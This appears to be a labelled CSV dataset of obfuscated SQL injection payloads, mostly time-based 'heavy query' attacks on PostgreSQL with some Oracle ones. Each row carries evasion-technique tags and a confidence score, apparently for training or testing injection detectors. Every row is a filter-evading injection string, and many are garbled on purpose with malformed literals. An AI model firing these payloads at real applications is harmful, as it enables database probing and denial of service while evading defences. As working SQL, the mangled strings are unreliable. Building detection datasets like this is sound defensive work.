payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1"" ) ) ANd 0O0b101000011000001= ( `SElecT COUnT ( * ) fRom gENeraTE_SeRies ( <(sEleCT (SeleCT 0X1)),0B10511000101111011001000 ) ; )> AND+(selECT 1) OR? 0o0/*T*<?cSMAF:Us*/--",heavy_query,postgresql,case_variation|inline_comment,0.46,rule,sqliv5_json,unknown
"select count ( *@ ) from generate_series ( 0x1,(SELECT((SELECT 0o23303504)) )[/*W w*/ and ( ;( '%'='",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1' ) %aS uqkZ whEre (SELECT 3422) = (sElECT 0X2151) && (sELECt 8407) = ( seLeCt COuNt ( * ) FROM GeNERAte_seRIES ( (SELecT (SelECT (sElect 1))),0O0b0X21eb289fE7D7E1d1540 ) ) && (sELect 0x1)*oR FALSE oR falSe Or (SElECT 0) --",heavy_query,postgresql,case_variation|scientific_notation,0.46,rule,sqliv5_json,unknown
"1' ) )/*6B; (SelECT (SELECT (SELECT (SELECT (SELECT 8)))))5HGM#*/ ) and (sELEct 0x154f) Like ( sElECT CoUNt ( * ) frOm gEnerAte_seRIES ( 0B0o4,0x0b0X4C4b0x28 ^) ): -anD ([ ( ( 'EfLk' =: 'eFlK",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"0O1%' ) _) Or@(sElEcT 0X70e5) = ( selECt couNt ( * ) {frOM GEnERATE_SERiES ( (selECT (seLEct (SELECT (SELECT 1)))),(SEleCt (SElEcT (SELEcT 0x0x0x880F4))) ) ) }and /**/( ( '%' Like '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"sEleCt cOUNT (${* )> FrOm geNeRaTe_sErIEs ( (SElECT`(selEct)0x3)),0b4O8o0o156631724 ) anD ( @( ; () 'XoRI'/**/LIKE;'xoRi",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLEct cOUNt ( * ), FrOm?geNERATE_seRIEs ( 0X0o1,0o3B0b10000111110010000110001110101101000111011111011011000110100010100010111100\ ) AnD ( (/*S0B181_nKy0b1001d{k*/ ( 'lDQQ'='LDQQ",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"0B1"" ) or (SelECT 3xD5D) = [ ( selECt cOUnt! ( * ) FROM GenerATe_seriES ( (SEleCt (SElEcT (seLEcT 0o1))),0X560F40 ) ) ANd ^( ""cTrR"" = ""CTrR",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0B1'}iN]bOoLeaN mODe ) %ANd (SElect 0o20327) LikE ( SelECt CouNT ( * ) From GeNERate_sEriES ( 0B1,(SeLEcT (sELeCt 0X4f5880)) ) ) oR FAlSe ANd tRUE#zo",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"4o1%"" aND;2x40D7 lIKE ( SElEct couNt ( * ) fRom]gEneRAtE_seRIes ( 0O0x1,(SeleCt 0X4C4C62) ) ) : oR fALSe &&;true#%And ""%""=""faFE?S",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"1' IN BooleAn mOdE ) or (SELEcT (sElEct (seleCt 0X1E06))) LIKe ] ~( SeLeCt cOUNT ( * ) fROM All_USERs t6,aLl_USERs t0X0b13,ALL_UseRS T3,aLl_USeRS T4,ALl_uSerS t8O5 ) or 0X0 * && ^0X1761/NOT LiKE (sElECT (select (SEleCT (SELect (SEleCT (SELEct 0x1745)))))) anD tRUE/*H*b9OmmG""=*/ && ""dl"" lIke ""Dl"" && tRUe Or ""?"" LiKE ""?;"" aNd 0X1 or faLse oR ""U~tQ""=""u~tqY"" OR False#SG]7po",heavy_query,unknown,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_double_quote
"SElEcT CounT ( ;* )[] fRoM GENeRate_SerIeS ( ?0X1,(SeLecT 0x4c7254) ) And ( (SELect (SELECT 0997)) LIKE 8997",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"SelECT * FRom GeNerATe_sEriEs (% (SEleCT (SELECT 0x1aed)),0B0b0b10010001101011011110101100011110010011101111,cASE=WHEn ({ (SeLeCT 0X255b) = 0B110511510101} ) 'TheN (SELeCt 0x1)_elSe 0X0 ENd~ ) liMiT`4x1--",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1"" whErE 0XbaD] = 0xbAd || (SelecT (SelEct (SelecT (SELECT 8421)))) = (+/**/SELECT@couNt ( * ) frOM GEneRaTE_seRies ( (SelEct (seLeCT (SelECT (seLEcT (SELECT 6))))),2X4c4B0B0X18b1c )^ )( anD tRue --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1` ) OR 0X0xAa7 not LIke :0Xa43 ANd (sElEct 0x0O255) noT Like`0x136(Or~falSE oR fALSe oR 0x8X0 oR(0X0O1152 LiKE 0x91bD/aND TrUE && "";"" noT LIke "";*"" AnD ""~CF"" LiKe ""~Cf"" oR false oR FALsE# ) ? ) % &&- (sELeCT (SElEct (SELecT^(SELEcT (SeleCt (SElEct;(sEleCt (seleCt (sElEct (SelEct 0X2599)))))))))) =< /*?)FRaMpQrjx*/ ( :sELEct couNT ( * ) FrOm AlL_users t9,aLL_uSErs T2,aLl_UsErs t0b0o0x0O0B0x9D,AlL_uSeRS T0b180,aLL_USERs T2b0X5 ) --J0o4U`~(7wVb+,tVF",heavy_query,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,unknown
"1 ) ) "" AND 0X20D7 lIkE @ ( /**/SelEcT cOUNt: ( * ) `)fROM gEnERaTe_SERiES ( (seLECT (sELecT (select (selecT+(seLECT (sElEcT 0x0x0x1)))))),0X0o0o4C4B0B501000 ) ') /aNd{ ( /*) */( 0x0B0x82f7fc37167/*!rE?:*/ LiKe (sElEct (SeleCT (selecT (sELeCt (SeleCt (sElecT 0o0x103D))))))<",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_double_quote
"2%"" ) and 0o0O0b0X8184F1aa08f= ( SELEcT coUNt ({<* ) <from GeNeRaTE_seRiEs ( (SElEcT (SEleCT 0O0o1)),(seLEcT 2O0x15fa596) ) ) And `( ""%""=""",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1 ) < ) ) Or (sELEcT 8156) like ( Select coUnT ( * ) ; FrOm GeNErATE_sERIes ( (SELECt (SELeCT 1)),0b0o0X4c4b40 ) ) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"1%' )[ |AnD (SElECt (SELECT'0x967)) |= ( SeLeCT}CounT ( ?* ) ; FRoM GEnEraTe_SERIeS ( (SELECT (SELECT 1)),(SELECT 5700400) ) ) and :<( '%'>=&'",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0b1%""]:)' AND (SeLecT (SelEct 8635)) =|^ (( SeLect CoUnt |(? * ,) fRoM GEnEratE_SeriEs (|""(select (SeleCT (seLEcT (SeleCt 0b1)))),0b10011010107107011001111} ) ) `&& 0X1AND1 OR (SELECT 0) aND TrUe ANd (SELECT 1) --",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,string_single_quote
"1' )[[^ )<&?< ) < ;Or 7x69e9b1b0B101=)+( Select\coUNT '( \*_ ))< FRom,genErATE_series (_ 2X8,0O0x0X1o0o4X0B0B9b0o6ad85 , ) * ?)%/* Bj;0X7@NL%H; [QUAL6?V K""l (seLeCt (SelECt 3))*/ _ && { ^ (/ ( ^ .-( 'TfNB' LIkE ;'Tfnb",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,unknown
"select * fRoM<GenErATe_Series ( (sELECT 0x16d6),(SeLect 9X718),caSe whEN ( 0x9X0o20d6 liKE 0O12143 ) THen (sEleCT 1) ElSE/**/0x3 enD ) ^LimiT (SEleCt (SELECT 1))--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1'/**/oR ( sElEcT 'XUOF' frOm dUaL wHere (SElEcT 0B10001001011011) =/*;1V*/ (select 0B0b10010001100010010000000001001101000110101010) or 0b1111111010110 lIKE ( SeleCt Count (, * ) frOM GEnerAte_SeRies ( 0X0O0o1,(sElect (seLEcT 5000000)) ) ) /**/--",heavy_query,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLECt COuNT ( * !) FrOM GenerAte_SEriES (< 0b3x8,0X0o0x4c4B40 /*KWi;*/) AND * ( ""jzMG"") lIkE; ""jzMG",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"select count ( * ) from generate_series ( 1,(SELECT 0x53ec60) /*KM*/)",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1' anD (SeLECT 0x197)` Like $( seLeCt$CoUNt )( * ) ^_fROm GEnerAtE_SeRiES ( (sELEcT (SELECT 0)),(SeLecT 0B0b0x21eb288fe7d7e1d1540) ) ) <and 'wYTg'='wytg",heavy_query,postgresql,case_variation|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1%' ) ) OR 9o0b0X105d6 NOt LIkE ^ ( sELEct COunt :( * ) FrOm geNErATe_SErIes ( 0x0B1,(sELEct (sElEct 9o23207220)) ) /*qUgq+W`J,VK a*/ ) Or falSe OR 'z' noT lIkE } 'z' And TRuE&&""TOY""!=""TOys"" OR fALSE/*Tl*/AND>TRue OR falsE ANd (sELecT (seLeCt (SELECt 1))) --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_double_quote
"SELEct COUNt ( * ?) froM gENERaTE_seRIeS ( (SELECT 1),0x0x4c4b40 `) ) ""+'",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"7X0b3'+ ( select'hSEf whERe (SeLEct 0X1228)=0X10F0/ || (sElect (SelecT (SELECT 9320)))= ({ seLect cOUNT ?( * ) fRoM GeNerATE_SEriES ( (selecT (SeLeCT""3)),0x9x4c0b171b0x99 ) ) *. ) +'",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"8B1"" AnD)(SelECT 0X20d0x7) =; ( }seleCt cOUNt ( ~* ~)-: frOM~gENEraTe_seRIEs ( 1X0b0x8,(SeLeCT (SELecT (SelECt 0X4C4B49))) } ): `) anD}""eSlO"" LIKe ""EsLO",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"0X1 ) ) aS Tbiq+WhErE 0X0b1103111910111 LiKE 0b0X1BF0B131 aND /*00jN&*/0x21BB LIkE ( @SElEct COUnT/**/ (/*F*/@* )* frOM GENeraTE_SeriEs ( 0x1,(SELecT)(SeLecT_0O0b1010111111010010101111100)) )_) ) OR ; (SELEcT (SELECT (SELEcT (sElect (seleCT (SELECT (SELECT (SELECT 0)))))))) Or FALsE Or fAlse AND True AND 0x1 --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1 $ or (SeLect (SEleCt 0x20E5)) =^ ( SElect coUnt ( * &) ) From GenerATe_serieS ( 0o8,(sELeCT 0O23046140) ) ' ) aND 0X0o14B0O1 IN ((sElEcT (seleCT/*W~(SeleCT (SELECT 9)) A1nyIGR&c*/(Select (SeLecT (SELeCT 0X0XCb2))))),0x12B3,0x12B4) oR "" Or falSe or 0X1F7E!=(sELect 0X1f6e) Or fALse#n"" noT lIke ""#n""# JMkIk.",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_double_quote
"9' And 0B0b0b11100101110100100001010001111111100000001110001001110100000011011000000000001001100010110011101110001001100000110010111010010011101111110101011_/*0o0O0x6<)5B1eUPO?t@`Pq && trUE Or falsE anD (sELect 0x8) or FaLSe OR (SELECT 0)#3F^W!vf R.a*/= [ ( ;SELEcT COunT (| * )[ from+gEneRaTe_SeRiES ( 0x1,0X4C0X4B0B0b1111110010' )[ ) OR 0x0 Or#fALSe or$fAlsE Or (selecT 0B0)`--GZhDO 5",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeLecT CounT ( * )` FrOm geNerAte_SerieS (@ 1,0O0x15FF3CE, ) && ""XCjT"" = ""xCjT",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1%"" )\ ) anD (SelecT (SeLecT 0x31Bb)) LIkE, oR 0x0 OR False OR 1281<>(SELECT (SELECT 1281)) OR 0# ([ SELECT CouNt ( * ) ` frOm Generate_sERieS ( (SELECT (SELECT 1)),0O23045500 ) ) --mDtA/",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1' ) WhERe ':' likE` ':'{oR 0X90e5%/*Cjs*^wPQdC_Fk*/= ; ( SeLeCT cOuNt +( * ) fROm gENERAte_SERIES ( '1X0x1,(Select (SeLecT<(SELECT 0o23045524))) ) ) &&(SELECT (SELECT 7)) or_False/*(SELECT 1)| I */OR ""q"" NOT ( = ""q"" OR False OR False --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,string_double_quote
"7, ( SelEcT - ( CASe WhEN )( oR faLse and (SelecT (sEleCt=2319)) not like (SElecT 2860) Or '!xC' NOT LIke '!Xc' Or FALSE OR 0 OR False AND True# (seLECt (sELeCT 3828)) LIKe (SElecT 3888) ) ThEn ( sEleCT CouNT ([ * =) fRoM GeNeRATE_SeRIes ( 5x0B0X1,(SeLeCT (selECT (sElect 5005001))) ) ) eLse 0b0o8x0b2/ ( SELECt 0X0^ ) End ) )$ inA",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,numeric
"SeLEcT coUNT ( '* /*M8s4H V*/) froM GENeRAtE_series ( 0O1,(sELeCt 0b11001101111111100110000) ) && TRuE OR faLse OR False#",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"1o0X1'* ) ) Or (sELECT (sElECT (sELecT 3x8081))) lIKE? (~ seLeCT coUnt ([ * ) frOm GenerATE_sEriES ( 0X0b0b0b1111101000,0X4c0x9b0o0b3x84 ) &) ; ;aNd !* ( (;| 'Qgov'='qgov+",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"selECT COUnT ( * ) . FrOM GENErATE_SerIeS ( 3B1,(SElEct 0b0o0B1011110011110011010111100)</) And (( (_/**/ 'wMOo' lIKe 'wMOO",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"0x1' wHErE 0x1a8A) Like 0x1a8B ANd (sElect[(SelecT 2x0b10101f7)) LikE \ ( SeLEcT COunT <( * )! FRom GeNEraTe_SeRIES ( (SeleCt 0X1),(SElecT 0X4c4d34) ) ); oR 0xdAC noT like 0xdac && TRUE OR False --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"1' OR (SelECT 6x20E0O5) LiKE ( SelEct CoUNt ( .* ) fROm geNeRate_SERIes ( 0b1,(SeLecT 0x4c4B40) ) /* yJSm*(sElect (SELECT 7))Kag2 */)",heavy_query,postgresql,case_variation|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"SelecT * fRoM GeneRATE_serIeS ( 0X11F0,0x0XbF0,caSE when , ( 0x11f0 lIkE (SeLEct (SELECT (SELECT 4692))) ) then 4x1 ElsE:0X0X0O0 enD< ) @ LimIt (sEleCT (selEct (SelEcT 0x5)))--",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"sElECT(*$fRom GENERAte_seRIEs ( (sELect (SELECT 3965)),0O2671,casE^WHen"" (% (SeLEcT 0x7a3) =`'(sElecT (sElECt 6222))& )/**/ ThEn<0O0X0O1 eLse (SeleCT 0) END) ) LimIt (seLeCt 8)--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"4'+ ( !sELEcT dyfw/**/WHERE~(seLect 0X1O1e5D) noT LIkE 3X1e3F && 0X81D5 =| ( {sElecT cOUnT (! * ) } from]GenErAte_SeRIes (/ (SelEcT (SELEct (SElECT 1))),0x4C9b40 ) )* ) +'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1 and (SEleCt 0B0x0b1315100101) lIkE ( seLeCT CouNt ( * ) fRoM GEneRAtE_sErIEs ( (SElEcT (SeLECt 1)),(SeLECt (SELECT 5030084)) ) ) -- ZOZJ[/|",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"0x8""|OR/**/0x20e5; LIKE ( %SelEcT{COUnt ( * ) ^From;GeNerATE_SERIEs ( (sEleCt 6x1),0X4c4B40 ) * ) oR ""s&""!=""S&"" Or FaLsE OR (seLEcT (SELECT 0)) And truE#] XxlJS",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"6"" ) ) ] as OIQR WHeRe 0o0Xaxc0B1/= (sELEcT (SELeCt 0O1X0XFB2)) oR 0X0x0o6fdc like ^ (\ seLeCT;COunt ( * )+ fROM%gENeRATe_seRiEs ( (SElect 1),0X4C6B0o50 ) ); Or (sELeCt (sELeCT (sElECT (SELEct (SEleCt 0x0)))))anDtRUE Or ""C&""<LIKE ""C&>"" oR ""R"" noT{lIke ""r"" AND ""W"" Not lIkE ""W2"" AnD tRuE or False or:5445<>(SELeCT 5455) AND tRuE aNd 0x6 --",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,string_double_quote
"1'+* ( sEleCt 'IgoI' wherE 0x1e0x8F ^={ 0x0o1E8F or/*iM */(SelecT 0B0b10010001100001001111000180111111111111000101)= (* SeLect COUNt ( * ) fROM geNEraTE_sERieS ( 0O0o0O1,0x4C4F0a ) /*g/yI Pg(aFFQy*/) ; )? +'",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"8' or (} sELEcT 'XyfT' FRom dUal wheRe 0X0x203A LIkE )(SeLECT (SeLect (SElEcT (SeLEct (seLect (SELecT (seLect (SELECT 8056))))))))|and (sEleCt (SELect 0O0B1010110114103)) like/**/ : ( SElECT COUnT ( * ) FRoM aLl_UsErS,T0X1,AlL_USeRS T0B0B1010,ALL_users T0b11,aLL_uSerS t4,AlL_UseRs T0b0B0o0b0O145 ) @) ""oR '",heavy_query,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"('{seleCt * FROM GeNErate_SeRiEs ( ?0o0B0b10110100111000,0b1001101111110,CaSE#WheN ( 2b1001101111110 LIkE[|(sELect 5065) <) ThEn 0X5 eLse 0b0 End )& LImIt 0x1 )",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"0B0b1"" ) ) && (sELect (seLeCT 8X60D2)) ]= { ( SeLECt CouNt (! * ) ' frOm GENERate_seriES ( (SElect (SELECT (SELECT (SELECT 0)))),0O0B0XE8F4a21cbDE125b1df44 `) ) anD )( ( ""TfrS"" =^ '""tFRS",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"9 anD 0x0o24D7= ( sElECt COUnT ([ * ) fRoM geNerAte_SerIeS ( 0b1,0x4c1b40-'%) ? ) oR (selEct 0x0) oR (SELeCT 689) NOT LIKE 0o0b1010119501 OR false ANd (SeLeCt (seLECt (SELECT 1))) or false AnD  OR False OR False#=TQMRL>fIU",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"0X1' OR ~( (SelecT 'IoCs' Where 0o0o0X0xD1E7 liKE (SeLEct (sELECT (SElECt (selecT (SeLeCT (sElECT (sELeCt 9287))))))) anD +(selECT 0x00d7) lIke _/**/ ( &sELEcT coUNt ( * ) + fRoM GenERaTE_SERIeS ( (seLEct 0B1),0B0X23f3d5F03F6E91b82D5 ) ; ) ) or '",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"1',IN}booLeAN MoDe ) - `AnD ; ~0B8x6a15 %= ( &SElECT CoUnt ( * ) FrOM All_uSErs t3B7b110,ALL_uSers T0b3x0x9,all_uSeRS T0o0O0xA,ALl_USErs[t6,aLL_usERs T0O5 <) 'OR /BP0!(sELeCt (SELECt 7)) Z .QT4*/> a0B0O0b7*/ FALSE;And]0B0xbaf noT liKe 0X0xBB0B3%aNd TRUe Or 0X6 Or 0x0X0\or faLSE=oR fAlse OR FALSe and 6x1 Or faLSE OR FALSe or FalSE]--",heavy_query,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,string_single_quote
"seLECT cOuNt ( * ) ; fROm GeNERATE_sERiES ( 9X0o0b4,0X9c3B3x28< ) > AnD [ ( ; (@ ( 'WvZw'='wvzW",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"4"" ) as YeCj WHeRe (SElECt 0x0b100aa)=(sElECt (sELECt 0x0x3aa)) anD (SELECT 3407) lIKE [(/ seleCt COunT (, * ) FROM geNeRatE_seRIeS ( (sElEcT/**/(SelEcT 0x1)),0X4C4b40 ?) ) or "" ""=""-9"" or fALSe --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"1%"" ) [ ;) oR 0b1111111011100 LIKE (/*T*/ SELECt couNt; ( * ) fROm GenEraTE_sErIeS ( (SELECT (SELECT 1)),0o6o0x0o0x15Fa57C ) ) AnD TRUe --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SelEct * FrOm@geNERatE_SeRies ( (sELECT 5X25ED),(SELECT (SELECT 9709)),cAse/*un R*/WhEN ( (SELECT (SELECT 9709))=0x1e73 ) Then (SELECT 1) ElsE 0 ENd ) . lIMit 1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1""[ ) ) as TFJH WherE!0o4O2129 LIke; (select (SelEcT<1134))=And 0o20675 = ( SelECt COUNt @( @* ) ] froM genERaTE_SeRIeS ( 0O0O4X1,(SeLECt 0B0B111B50011111101011081010001000111111100111110101111110900111010001100100110010) /) | ()\ and((seLeCT (SeLeCT 0o0b11101010101100))*nOt lIkE (selECt 0b1101070010001) And tRUe AND True#OR ""8"" LiKe ""8F"" or 0x0 OR "" "" lIKe "" m"" or@(seLeCt 0xDa9)/**/LIkE 0xF0b0b1111101001E AnD 0o0b10011101111 nOT lIke 0b1010110100 and (SeLecT (SEleCt 1)) or;0X0 && truE and trUE --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"0B0X1""^ ) WherE'0x7D0B10 lIkE 0Xa2A && 0x0O24D4 = ( Select COUNt ( * ) FRom:GeNERAte_sErIES ( (SElect (SELECT (SELECT 1))),(sElecT (SeLeCT (SELECT 0X4C9960))) ) ~ ) Or% (SElecT (SELECt 0b1101111100)) NOt lIKe 0B1101111100 --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"0x1 )% Or}(SELECt?(seLEcT (SEleCT (SELECt 0X0o3cF9))))] LiKe ( seLecT COUNT ( * ) fRoM SYsiBm.sYStablEs/*n?6/?*/AS t1,SySibm.SyStAbleS`As t0x3b10,sySibM.syStABlEs/*Y/tZ l'<*/aS_T0X3/ ) * ;Or faLSE aNd 'N,;' NoT lIkE 'n,;_' OR (SeLEcT (SeLeCt (SELEcT 0X6E4)))<>(SELect 0X2e3) aNd trUE OR False --",heavy_query,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.8,rule,sqliv5_json,string_single_quote
"sELecT(cOUnT( ( * ) FROm gEneRAtE_SErIEs ( (sELeCt (SeLecT (sELect (SELECT 1)))),0b0o23545500 ) /**/and <( ""%"" LikE """,heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
"SELECt counT ( (* ) ] FroM GEneRate_sERIES ( (SEleCt 1),(sElECt 1x6C6b22) *) AnD{ ( ( ( ""%"" )LIke """,heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"1'/*mw""=(SELEcT (SElect 1))*/ \ && (sELECT 0x2067) =.,.(-<seleCt)cOunt (} * )) fRom GeneRAte_SERiEs (; 7x3,0X9c3X0o4b49 ; ) / )} +And 'ZetF' LIKe 'ZETF",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,unknown
"1, ( SELEcT * fRoM GENeRAte_sEriEs ( 0x10bd,5509,caSE%whEN} ( 0x15e9 LIKE 0x15e9 ) tHEN (SELECT 1) eLsE (SELECT 0x0) EnD ) LimIT (SELECT~(SELECT (SELECT 6)))/**3o*/ )",heavy_query,postgresql,case_variation|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1' or (sElect (selECt 8428)) LIKE ( SeLEcT coUnt ( * ) FrOm GeneRate_seRieS ( (SelECT (select 1)),0X4cc474 ) ) ANd 'JIYX' lIke 'jIYx",heavy_query,postgresql,case_variation|function_alternative,0.46,rule,sqliv5_json,unknown
"( seLEct 6 frOm geNeratE_SEriEs ( 0X0488,(sELeCT (SelECt 3352)),cAsE`WhEN!; () 9O0b101100101111110 LiKE 0xD18 ) THEN 0o8 ELSE (sElECt 0) EnD> ) LIMIT 0o4 ))|",heavy_query,postgresql,case_variation,0.46,rule,sqliv5_json,unknown
"SeLecT`**FROM~GenEraTe_SerIEs ( {0x57f,7407,CaSe WHen@ .(?:0x1cef LikE 0x19a2< ) tHEn 0o1 ELSE (sElecT (selEct 0)) enD, ), LIMit (SElEct (sELECt (SELECT 1)))--",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"sElect|*\from)GENEraTe_serieS ( 0X21FF,0x24dA,CAsE<wHEn.+ ( \5O0X1d0X8D:=*4X80eB .)/*b * r*\nUg<<dAub*/ ^theN 0b0x1/*klj[*/ELsE (SELEcT-0X9)|End{ )+ `LiMIT<7O0x0o1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SelEcT * From geNErAte_seRIES ( 0B111110210110,(SeLEcT (seLECt 3995)),Case wHEn (/**/ (seLect 0xF96)&< Like (sELecT 9597) ) tHEn 3B6O0X0X1 ELsE (SeLecT 0) eND )_ lImit 0o1--",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
